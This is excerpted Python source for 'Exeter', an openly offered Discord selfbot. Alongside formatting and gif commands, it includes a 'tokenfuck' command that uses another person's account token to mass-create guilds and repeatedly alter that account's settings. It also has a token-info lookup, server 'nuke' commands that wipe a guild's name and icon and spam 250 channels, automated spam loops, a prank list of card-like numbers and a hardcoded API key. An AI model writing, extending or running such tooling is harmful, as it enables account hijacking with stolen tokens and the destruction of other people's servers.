...
# ---------------------------------------------------------------------------
    ...
    print(f"""{Style.BRIGHT}
                                ...
                                ╚══════╝    ╚═╝  ╚═╝    ╚══════╝       ╚═╝       ╚══════╝    ╚═╝  ╚═╝
                                 ...
                                 """.replace('█', f'{Fore.WHITE}█{Fore.RED}')+f"""
                                 
                                {Fore.RED}Developer: {Fore.CYAN}korea.

                                {Fore.RED}User =>  {Fore.RED}{Exeter.user.name}#{Exeter.user.discriminator}{Fore.LIGHTYELLOW_EX}{Fore.LIGHTYELLOW_EX}     ||{Fore.LIGHTYELLOW_EX}  {Fore.RED}ID => {Fore.RED}{Exeter.user.id}   
                                {Fore.RED}Nitro => {Fore.RED}{nitro}{Fore.LIGHTYELLOW_EX}     ||  {Fore.RED}SlotBot => {Fore.RED}{slotbot}
                                {Fore.RED}Giveaway => {Fore.RED}{giveaway}{Fore.LIGHTYELLOW_EX}     ||  {Fore.RED}Exeter =>{Fore.LIGHTYELLOW_EX} v{SELFBOT.__version__}     
                                {Fore.RED}Prefix => {Fore.GREEN}{Exeter.command_prefix}{Fore.LIGHTYELLOW_EX}     
{Style.RESET_ALL}
""")
...
Exeter = commands.Bot(description='Exeter ~ Free & OpenSource Selfbot', command_prefix=prefix, self_bot=True)
...
Exeter.copycat = None
Exeter.remove_command('help') # Remove default discordpy help command
# ---------------------------------------------------------------------------
# Events
@Exeter.event
...
async def on_message(message):
    ...
    if f'Congratulations <@{Exeter.user.id}>' in message.content or f'<@{Exeter.user.id}> won' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009 or message.author.id == 673918978178940951 or message.author.id == 582537632991543307 or message.author.id == 649604306596528138:
                print(""
...
async def adminservers(ctx):
    ...
    adminPermServers = f"**Servers with Admin:**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission:**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission:**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission:**\n{kicks}"
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(name="𝙀𝙓𝙀𝙏𝙀𝙍 𝙍𝙀𝙑𝘼𝙈𝙋〡𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix),
                         icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/807508942615740437/807509750367256576/exeter.gif")
        embed.set_image(url="https://media.discordapp.net/attachments/809359238672547863/809613849024135178/img1.gif?width=360&height=203")
        embed.add_field(name="\🩸 `𝘨𝘦𝘯𝘦𝘳𝘢𝘭`", value="*Shows all general commands*", inline=False)
        embed.add_field(name="\🩸 `𝘢𝘤𝘤𝘰𝘶𝘯𝘵`", value="*Shows all account commands*", inline=False)
        embed.add_field(name="\🩸 `𝘵𝘦𝘹𝘵`", value="*Shows all text commands*", inline=False)
        embed.add_field(name="\🩸 `𝘮𝘶𝘴𝘪𝘤`", value="*Shows all music commands*", inline=False)
        embed.add_field(name="\🩸 `𝘪𝘮𝘢𝘨𝘦`", value="*Shows all image manipulation commands*", inline=False)
        embed.add_field(name="\🩸 `𝘯𝘴𝘧𝘸`", value="*Shows all nsfw commands*", inline=False)
        embed.add_field(name="\🩸 `𝘮𝘪𝘴𝘤`", value="*Shows all miscellaneous commands*", inline=False)
        embed.add_field(name="\🩸 `𝘥𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳`", value="*Shows all developer commands*", inline=False)
        embed.add_field(name="\🩸 `𝘢𝘯𝘵𝘪-𝘯𝘶𝘬𝘦`", value="*Shows all anti-nuke commands*", inline=False)
        embed.add_field(name="\🩸 `𝘯𝘶𝘬𝘦`", value="*Shows all nuke commands*", inline=False)
        embed.description = f'[Github](https://github.com/k6d/exeter-revamp "Click me!") '
        ...
        await ctx.send(embed=embed)
    elif str(category).lower() == "developer":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.description = f"\🩸 `DEVELOPER COMMANDS`\n`> css <message>` - send message as css codeblock\n`> js` - send message as javascript codeblock\n`> yaml` - send message as yaml codeblock\n`> py` - send message as python codeblock\n`> markdown` - send message as markdown codeblock\n`> json` - send message as json codeblockr"
        await ctx.send(embed=embed)
...
async def gif(ctx, query=None):
    await ctx.message.delete()
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=YVPjGUBXac8NF1X7uL7uomMksSulXIpB&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=YVPjGUBXac8NF1X7uL7uomMksSulXIpB&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
...
@Exeter.command(aliases=["ornhublogo", "phlogo"])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_Exeter_logo.png"))
    except:
        await ctx.send(endpoint)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_Exeter_comment.png"))
    except:
        await ctx.send(res["message"])
...
async def hack(ctx, user: discord.User=None):
    ...
    cc = ["5538902820471545, 03/2026, 300", "5538902532634562, 08/2026, 638", "5538902383374813, 06/2023, 486", "5538902665262041, 09/2023, 754", "5538902363144608, 02/2026, 601"]
...
@Exeter.command(aliases=['lagger', 'lag'])
...
@Exeter.command(aliases=['whois', 'user'])
...
async def ghost(ctx):
    ...
    if config.get('password') == 'password-here':
        print(f"[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')
...
async def hypesquad(ctx, house):
    ...
    try:
        request.post('https://discord.com/api/v8/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f'[ERROR]: {Fore.YELLOW}{e}' + Fore.RESET)
...
async def tokenfuck(ctx, _token):
    ...
    for _i in range(50):
        requests.post('https://discord.com/api/v8/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f'[ERROR]: {Fore.YELLOW}{e}' + Fore.RESET)
        else:
            break
    ...
    while True:
        ...
        while True:
            try:
                request.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f'[ERROR]: {Fore.YELLOW}{e}' + Fore.RESET)
            else:
...
async def tokeninfo(ctx, _token):
    ...
    try:
        res = requests.get('https://canary.discord.com/api/v8/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
...
async def destroy(ctx):
    ...
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="ExeterNuker",
            reason="Nuked By Exeter ;)",
            icon=None,
            banner=None
        )
    except:
...
async def spamchannels(ctx, channel):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name=f"{channel}")
        except:
            return
...
@Exeter.command(name='dankmemer', aliases=['dank', 'dmc'])
async def dankmemer(ctx, channelid): # b'\xfc'
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1
            channel = Exeter.get_channel(int(channelid))
            await channel.send('pls beg', delete_after=0.1)
            await channel.send('pls dep max', delete_after=0.1)
            print(f'{Fore.BLUE}[DANK-MEMER] {Fore.GREEN}Beg number: {count} sent'+Fore.RESET)
            await asyncio.sleep(46)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Exeter.command(name='dank-fish', aliases=['dankfish'])
...
@Exeter.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid): # b'\xfc'
    ...
    while True:
        try:
            count += 1
            channel = Exeter.get_channel(int(channelid))
            await channel.send('!d bump', delete_after=0.1)
...
@Exeter.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
...
async def competing(ctx, *, message):
    ...
    embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
    embed.description = f'[Your status changed to competing in **' + message + '**](https://google.com "EXETER ON TOP")\n\n:)'
    await ctx.send(embed=embed)
...
@Exeter.command()
async def json(ctx, *, message):
    await ctx.message.delete()
    await ctx.send("```json\n" + message + '```')

@Exeter.command()
async def markdown(ctx, *, message):
    await ctx.message.delete()
    await ctx.send("```markdown\n" + message + '```')

@Exeter.command()
async def py(ctx, *, message):
    await ctx.message.delete()
